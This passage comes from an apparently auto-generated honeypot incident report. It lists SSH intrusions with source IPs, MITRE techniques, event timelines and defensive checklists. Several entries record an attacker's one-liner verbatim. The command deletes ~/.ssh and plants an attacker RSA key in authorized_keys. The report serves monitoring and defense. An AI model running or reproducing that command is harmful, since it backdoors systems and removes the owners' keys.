| `2026-09-24 10:48:46` | `cowrie.command.failed` |
| `2026-09-24 10:48:46` | `cowrie.log.closed` |
| `2026-09-24 10:48:47` | `cowrie.session.params` |
| `2026-09-24 10:48:47` | `cowrie.command.input` |
| `2026-09-24 10:48:47` | `cowrie.session.file_download` |
| `2026-09-24 10:48:47` | `cowrie.log.closed` |
| `2026-09-24 10:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.57.27[.]21` to AbuseIPDB if not already reported
- [ ] Block `31.57.27[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed716e31fed7

| Field | Detail |
|---|---|
| **Source IP** | `31.57.27[.]21` |
| **First Seen** | 2026-09-24 10:48 |
| **Last Seen** | 2026-09-24 10:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:48:47` | `cowrie.session.connect` |
| `2026-09-24 10:48:47` | `cowrie.client.version` |
| `2026-09-24 10:48:47` | `cowrie.client.kex` |
| `2026-09-24 10:48:48` | `cowrie.login.success` |
| `2026-09-24 10:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.57.27[.]21` to AbuseIPDB if not already reported
- [ ] Block `31.57.27[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f31b51e65ce

| Field | Detail |
|---|---|
| **Source IP** | `31.57.27[.]21` |
| **First Seen** | 2026-09-24 10:48 |
| **Last Seen** | 2026-09-24 10:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:48:48` | `cowrie.session.connect` |
| `2026-09-24 10:48:48` | `cowrie.client.version` |
| `2026-09-24 10:48:48` | `cowrie.client.kex` |
| `2026-09-24 10:48:49` | `cowrie.login.success` |
| `2026-09-24 10:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.57.27[.]21` to AbuseIPDB if not already reported
- [ ] Block `31.57.27[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c578784b5940

| Field | Detail |
|---|---|
| **Source IP** | `117.50.208[.]11` |
| **First Seen** | 2026-09-24 11:26 |
| **Last Seen** | 2026-09-24 11:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 11:26:48` | `cowrie.session.connect` |
| `2026-09-24 11:26:48` | `cowrie.client.version` |
| `2026-09-24 11:26:48` | `cowrie.client.kex` |
| `2026-09-24 11:26:49` | `cowrie.login.success` |
| `2026-09-24 11:26:50` | `cowrie.session.params` |
| `2026-09-24 11:26:50` | `cowrie.command.input` |
| `2026-09-24 11:26:50` | `cowrie.command.failed` |
| `2026-09-24 11:26:51` | `cowrie.log.closed` |
| `2026-09-24 11:26:52` | `cowrie.session.params` |
| `2026-09-24 11:26:52` | `cowrie.command.input` |
| `2026-09-24 11:26:52` | `cowrie.session.file_download` |
| `2026-09-24 11:26:52` | `cowrie.log.closed` |
| `2026-09-24 11:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.208[.]11` to AbuseIPDB if not already reported
- [ ] Block `117.50.208[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e0cbad209a8

| Field | Detail |
|---|---|
| **Source IP** | `117.50.208[.]11` |
| **First Seen** | 2026-09-24 11:26 |
| **Last Seen** | 2026-09-24 11:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 11:26:52` | `cowrie.session.connect` |
| `2026-09-24 11:26:52` | `cowrie.client.version` |
| `2026-09-24 11:26:52` | `cowrie.client.kex` |
| `2026-09-24 11:26:53` | `cowrie.login.success` |
| `2026-09-24 11:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.208[.]11` to AbuseIPDB if not already reported
- [ ] Block `117.50.208[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de3debd3031c

| Field | Detail |
|---|---|
| **Source IP** | `117.50.208[.]11` |
| **First Seen** | 2026-09-24 11:26 |
| **Last Seen** | 2026-09-24 11:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 11:26:54` | `cowrie.session.connect` |
| `2026-09-24 11:26:54` | `cowrie.client.version` |
| `2026-09-24 11:26:55` | `cowrie.client.kex` |
| `2026-09-24 11:26:56` | `cowrie.login.success` |
| `2026-09-24 11:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.208[.]11` to AbuseIPDB if not already reported
- [ ] Block `117.50.208[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9432dd850563

| Field | Detail |
|---|---|
| **Source IP** | `196.49.7[.]116` |
| **First Seen** | 2026-09-24 11:30 |
| **Last Seen** | 2026-09-24 11:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 11:30:27` | `cowrie.session.connect` |
| `2026-09-24 11:30:27` | `cowrie.client.version` |
| `2026-09-24 11:30:28` | `cowrie.client.kex` |
| `2026-09-24 11:30:29` | `cowrie.login.success` |
| `2026-09-24 11:30:30` | `cowrie.session.params` |
| `2026-09-24 11:30:30` | `cowrie.command.input` |
| `2026-09-24 11:30:30` | `cowrie.command.failed` |
| `2026-09-24 11:30:30` | `cowrie.log.closed` |
| `2026-09-24 11:30:31` | `cowrie.session.params` |
| `2026-09-24 11:30:31` | `cowrie.command.input` |
| `2026-09-24 11:30:31` | `cowrie.session.file_download` |
| `2026-09-24 11:30:31` | `cowrie.log.closed` |
| `2026-09-24 11:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.49.7[.]116` to AbuseIPDB if not already reported
- [ ] Block `196.49.7[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ac507404a65

| Field | Detail |
|---|---|
| **Source IP** | `196.49.7[.]116` |
| **First Seen** | 2026-09-24 11:30 |
| **Last Seen** | 2026-09-24 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 11:30:31` | `cowrie.session.connect` |
| `2026-09-24 11:30:31` | `cowrie.client.version` |
| `2026-09-24 11:30:32` | `cowrie.client.kex` |
| `2026-09-24 11:30:32` | `cowrie.login.success` |
| `2026-09-24 11:30:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.49.7[.]116` to AbuseIPDB if not already reported
- [ ] Block `196.49.7[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdc80aa6ddf8

| Field | Detail |
|---|---|
| **Source IP** | `196.49.7[.]116` |
| **First Seen** | 2026-09-24 11:30 |
| **Last Seen** | 2026-09-24 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 11:30:33` | `cowrie.session.connect` |
| `2026-09-24 11:30:33` | `cowrie.client.version` |
| `2026-09-24 11:30:33` | `cowrie.client.kex` |
| `2026-09-24 11:30:34` | `cowrie.login.success` |
| `2026-09-24 11:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.49.7[.]116` to AbuseIPDB if not already reported
- [ ] Block `196.49.7[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c8a3f2b8a91

| Field | Detail |
|---|---|
| **Source IP** | `45.33.109[.]8` |
| **First Seen** | 2026-09-24 11:35 |
| **Last Seen** | 2026-09-24 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 11:35:07` | `cowrie.session.connect` |
| `2026-09-24 11:35:07` | `cowrie.login.success` |
| `2026-09-24 11:35:07` | `cowrie.session.params` |
| `2026-09-24 11:35:08` | `cowrie.log.closed` |
| `2026-09-24 11:35:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.109[.]8` to AbuseIPDB if not already reported
- [ ] Block `45.33.109[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81d049484065

| Field | Detail |
|---|---|
| **Source IP** | `193.187.110[.]214` |
| **First Seen** | 2026-09-24 11:39 |
| **Last Seen** | 2026-09-24 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 11:39:39` | `cowrie.session.connect` |
| `2026-09-24 11:39:39` | `cowrie.client.version` |
| `2026-09-24 11:39:39` | `cowrie.client.kex` |
| `2026-09-24 11:39:39` | `cowrie.login.success` |
| `2026-09-24 11:39:40` | `cowrie.direct-tcpip.request` |
| `2026-09-24 11:39:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-24 11:39:40` | `cowrie.direct-tcpip.data` |
| `2026-09-24 11:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.187.110[.]214` to AbuseIPDB if not already reported
- [ ] Block `193.187.110[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-964d7df82465

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 11:41 |
| **Last Seen** | 2026-09-24 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 11:41:19` | `cowrie.session.connect` |
| `2026-09-24 11:41:19` | `cowrie.client.version` |
| `2026-09-24 11:41:19` | `cowrie.client.kex` |
| `2026-09-24 11:41:19` | `cowrie.login.success` |
| `2026-09-24 11:41:20` | `cowrie.direct-tcpip.request` |
| `2026-09-24 11:41:20` | `cowrie.direct-tcpip.data` |
| `2026-09-24 11:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a2fd9591473

| Field | Detail |
|---|---|
| **Source IP** | `179.255.244[.]206` |
| **First Seen** | 2026-09-24 12:03 |
| **Last Seen** | 2026-09-24 12:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:03:44` | `cowrie.session.connect` |
| `2026-09-24 12:03:45` | `cowrie.client.version` |
| `2026-09-24 12:03:45` | `cowrie.client.kex` |
| `2026-09-24 12:03:47` | `cowrie.login.success` |
| `2026-09-24 12:03:48` | `cowrie.direct-tcpip.request` |
| `2026-09-24 12:03:48` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 12:03:48` | `cowrie.direct-tcpip.data` |
| `2026-09-24 12:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.255.244[.]206` to AbuseIPDB if not already reported
- [ ] Block `179.255.244[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95391deafdd1

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-24 12:05 |
| **Last Seen** | 2026-09-24 12:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:05:20` | `cowrie.session.connect` |
| `2026-09-24 12:05:20` | `cowrie.client.version` |
| `2026-09-24 12:05:20` | `cowrie.client.kex` |
| `2026-09-24 12:05:20` | `cowrie.login.success` |
| `2026-09-24 12:05:22` | `cowrie.direct-tcpip.request` |
| `2026-09-24 12:05:23` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 12:05:23` | `cowrie.direct-tcpip.data` |
| `2026-09-24 12:05:24` | `cowrie.direct-tcpip.request` |
| `2026-09-24 12:05:24` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 12:05:24` | `cowrie.direct-tcpip.data` |
| `2026-09-24 12:05:25` | `cowrie.direct-tcpip.request` |
| `2026-09-24 12:05:25` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 12:05:25` | `cowrie.direct-tcpip.data` |
| `2026-09-24 12:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b8c905410ec

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-24 12:08 |
| **Last Seen** | 2026-09-24 12:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:08:08` | `cowrie.session.connect` |
| `2026-09-24 12:08:08` | `cowrie.client.version` |
| `2026-09-24 12:08:08` | `cowrie.client.kex` |
| `2026-09-24 12:08:09` | `cowrie.login.success` |
| `2026-09-24 12:08:10` | `cowrie.direct-tcpip.request` |
| `2026-09-24 12:08:10` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 12:08:10` | `cowrie.direct-tcpip.data` |
| `2026-09-24 12:08:11` | `cowrie.direct-tcpip.request` |
| `2026-09-24 12:08:12` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 12:08:12` | `cowrie.direct-tcpip.data` |
| `2026-09-24 12:08:13` | `cowrie.direct-tcpip.request` |
| `2026-09-24 12:08:14` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 12:08:14` | `cowrie.direct-tcpip.data` |
| `2026-09-24 12:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bef42b66b5f6

| Field | Detail |
|---|---|
| **Source IP** | `176.65.134[.]121` |
| **First Seen** | 2026-09-24 12:09 |
| **Last Seen** | 2026-09-24 12:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `root, root, admin` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:09:20` | `cowrie.session.connect` |
| `2026-09-24 12:09:21` | `cowrie.login.failed` |
| `2026-09-24 12:09:22` | `cowrie.login.success` |
| `2026-09-24 12:09:23` | `cowrie.session.params` |
| `2026-09-24 12:09:23` | `cowrie.command.input` |
| `2026-09-24 12:09:23` | `cowrie.command.failed` |
| `2026-09-24 12:09:23` | `cowrie.command.input` |
| `2026-09-24 12:09:23` | `cowrie.command.failed` |
| `2026-09-24 12:09:24` | `cowrie.command.input` |
| `2026-09-24 12:09:24` | `cowrie.command.failed` |
| `2026-09-24 12:09:24` | `cowrie.log.closed` |
| `2026-09-24 12:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.134[.]121` to AbuseIPDB if not already reported
- [ ] Block `176.65.134[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5549fda18ec6

| Field | Detail |
|---|---|
| **Source IP** | `47.254.195[.]162` |
| **First Seen** | 2026-09-24 12:20 |
| **Last Seen** | 2026-09-24 12:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:20:06` | `cowrie.session.connect` |
| `2026-09-24 12:20:06` | `cowrie.login.success` |
| `2026-09-24 12:20:06` | `cowrie.session.params` |
| `2026-09-24 12:20:06` | `cowrie.command.input` |
| `2026-09-24 12:20:06` | `cowrie.command.failed` |
| `2026-09-24 12:20:06` | `cowrie.command.input` |
| `2026-09-24 12:20:06` | `cowrie.command.failed` |
| `2026-09-24 12:20:06` | `cowrie.command.input` |
| `2026-09-24 12:20:09` | `cowrie.log.closed` |
| `2026-09-24 12:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.254.195[.]162` to AbuseIPDB if not already reported
- [ ] Block `47.254.195[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f679d947428

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-09-24 12:26 |
| **Last Seen** | 2026-09-24 12:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:26:29` | `cowrie.session.connect` |
| `2026-09-24 12:26:29` | `cowrie.client.version` |
| `2026-09-24 12:26:30` | `cowrie.client.kex` |
| `2026-09-24 12:26:31` | `cowrie.login.success` |
| `2026-09-24 12:26:32` | `cowrie.session.params` |
| `2026-09-24 12:26:32` | `cowrie.command.input` |
| `2026-09-24 12:26:32` | `cowrie.command.failed` |
| `2026-09-24 12:26:32` | `cowrie.log.closed` |
| `2026-09-24 12:26:33` | `cowrie.session.params` |
| `2026-09-24 12:26:33` | `cowrie.command.input` |
| `2026-09-24 12:26:33` | `cowrie.session.file_download` |
| `2026-09-24 12:26:33` | `cowrie.log.closed` |
| `2026-09-24 12:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e00a1eec9cb9

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-09-24 12:26 |
| **Last Seen** | 2026-09-24 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:26:34` | `cowrie.session.connect` |
| `2026-09-24 12:26:34` | `cowrie.client.version` |
| `2026-09-24 12:26:34` | `cowrie.client.kex` |
| `2026-09-24 12:26:35` | `cowrie.login.success` |
| `2026-09-24 12:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0e6d359aa54

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-09-24 12:26 |
| **Last Seen** | 2026-09-24 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:26:35` | `cowrie.session.connect` |
| `2026-09-24 12:26:35` | `cowrie.client.version` |
| `2026-09-24 12:26:36` | `cowrie.client.kex` |
| `2026-09-24 12:26:37` | `cowrie.login.success` |
| `2026-09-24 12:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c9978f20d53

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 12:29 |
| **Last Seen** | 2026-09-24 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:29:21` | `cowrie.session.connect` |
| `2026-09-24 12:29:21` | `cowrie.client.version` |
| `2026-09-24 12:29:21` | `cowrie.client.kex` |
| `2026-09-24 12:29:22` | `cowrie.login.success` |
| `2026-09-24 12:29:22` | `cowrie.direct-tcpip.request` |
| `2026-09-24 12:29:22` | `cowrie.direct-tcpip.data` |
| `2026-09-24 12:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-278084245165

| Field | Detail |
|---|---|
| **Source IP** | `81.211.72[.]167` |
| **First Seen** | 2026-09-24 12:30 |
| **Last Seen** | 2026-09-24 12:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:30:19` | `cowrie.session.connect` |
| `2026-09-24 12:30:19` | `cowrie.client.version` |
| `2026-09-24 12:30:19` | `cowrie.client.kex` |
| `2026-09-24 12:30:20` | `cowrie.login.success` |
| `2026-09-24 12:30:20` | `cowrie.session.params` |
| `2026-09-24 12:30:20` | `cowrie.command.input` |
| `2026-09-24 12:30:20` | `cowrie.command.failed` |
| `2026-09-24 12:30:21` | `cowrie.log.closed` |
| `2026-09-24 12:30:21` | `cowrie.session.params` |
| `2026-09-24 12:30:21` | `cowrie.command.input` |
